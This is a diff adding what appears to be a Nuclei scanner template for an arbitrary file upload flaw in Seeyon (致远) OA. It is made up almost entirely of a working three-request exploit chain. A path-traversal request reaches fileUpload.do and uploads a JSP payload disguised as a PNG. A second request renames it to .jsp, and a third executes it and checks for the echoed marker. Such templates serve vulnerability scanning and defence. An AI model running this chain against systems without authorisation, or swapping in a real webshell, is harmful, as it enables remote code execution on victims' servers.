@@ -1,0 +1,86 @@
+id: zyoa-fileUpload-do-FileUpload
+
+info:
+  name: 致远OA-任意文件上传-fileUpload
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+  
+http:
+  - raw:
+      - |
+        POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="type"
+        
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="extensions"
+        
+        png
+        --{{boundary}}
+        Content-Disposition: form-data; name="applicationCategory"
+        
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="destDirectory"
+        
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="destFilename"
+        
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="maxSize"
+        
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="isEncrypt"
+        
+        false
+        --{{boundary}}
+        Content-Disposition: form-data; name="file1"; filename="1.png"
+        Content-Type: Content-Type: application/pdf
+        
+        <% out.println("12321");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --{{boundary}}--
+
+      - |
+        POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        
+        method=uploadMenuIcon&fileid={{path}}&filename={{filename}}.jsp
+
+      - |
+        GET /seeyon/main/menuIcon/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    extractors:
+      - type: regex
+        name: path
+        group: 3
+        regex:
+           - 'application/pdf", "(\w*-\w*-\w*)", "(\w*)", "(\S*)"'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321")
